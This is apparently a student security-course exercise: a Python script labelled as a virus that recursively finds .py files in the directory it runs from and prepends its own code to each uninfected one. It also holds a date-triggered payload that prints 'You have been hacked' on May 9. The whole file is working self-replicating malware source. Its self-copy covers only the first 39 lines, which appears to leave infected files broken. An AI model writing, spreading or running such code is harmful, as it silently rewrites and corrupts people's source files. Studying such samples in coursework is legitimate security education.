#!/usr/bin/env python3

# Script: Ops 301 ops chal-14
# Author: Justin H
# Date of latest revision: 3/30/23
# Purpose: VIRUS -DONT RUN THIS-
# Team: Geneva, Nick, && Sierra

# This code represents a simple virus that searches for Python files on a directory and infects them. 
# The virus contains a signature and a payload that can be detonated on a specific date.

# Import required modules
import os
import datetime

# Set signature to identify the virus code in infected files
SIGNATURE = "VIRUS"

# Function to search for files with ".py" extension and return a list of the file paths
def locate(path):
    files_targeted = [] # Initialize list to store targeted files
    filelist = os.listdir(path) # Get a list of all files in the directory
    for fname in filelist:
        if os.path.isdir(path+"/"+fname): # If the current file is a directory, recursively search it
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py": # If the file has a .py extension, check if it has already been infected
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname) # If the file hasn't been infected, add it to the list
    return files_targeted

# Function to infect files by appending the virus code to them
def infect(files_targeted):
    virus = open(os.path.abspath(__file__)) # Open the virus file
    virusstring = ""
    for i,line in enumerate(virus): # Read the virus code into a string
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted: # For each targeted file, read the file contents and write the virus code to it
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# Function to detonate the virus payload on a specific date
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: # If the current date is May 9th
        print("You have been hacked")

# Call the locate() function to get a list of files to infect
files_targeted = locate(os.path.abspath(""))
# Call the infect() function to infect the targeted files with the virus code
infect(files_targeted)
# Call the detonate() function to check if it's the date to detonate the payload
detonate()
